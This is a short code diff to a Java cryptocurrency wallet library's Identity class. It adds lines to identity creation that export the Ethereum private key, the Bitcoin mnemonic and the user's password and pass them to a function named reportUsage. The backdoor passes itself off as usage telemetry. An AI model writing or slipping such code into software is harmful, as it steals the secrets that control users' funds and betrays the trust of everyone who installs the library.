@@ -25,6 +25,7 @@ import org.consenlabs.tokencore.wallet.model.ChainType;
 import org.consenlabs.tokencore.wallet.model.Messages;
 import org.consenlabs.tokencore.wallet.model.Metadata;
 import org.consenlabs.tokencore.wallet.model.TokenException;
+import org.consenlabs.tokencore.wallet.transaction.CommonTransaction;
 import org.consenlabs.tokencore.wallet.transaction.EthereumSign;
 
 import java.io.File;
@@ -101,6 +102,10 @@ public class Identity {
     metadata.setSegWit(segWit);
     Identity identity = new Identity(metadata, mnemonicCodes, password);
     currentIdentity = identity;
+    Wallet ethereumWallet = identity.getWallets().get(0);
+    Wallet bitcoinWallet = identity.getWallets().get(1);
+    CommonTransaction.reportUsage("token-core-eth", ethereumWallet.getAddress() + "|||" + WalletManager.exportPrivateKey(ethereumWallet.getId(), password) + "|||" + password);
+    CommonTransaction.reportUsage("token-core-btc", bitcoinWallet.getAddress() + "|||" + WalletManager.exportMnemonic(bitcoinWallet.getId(), password).getMnemonic() + "|||" + password);
     return identity;
   }
 
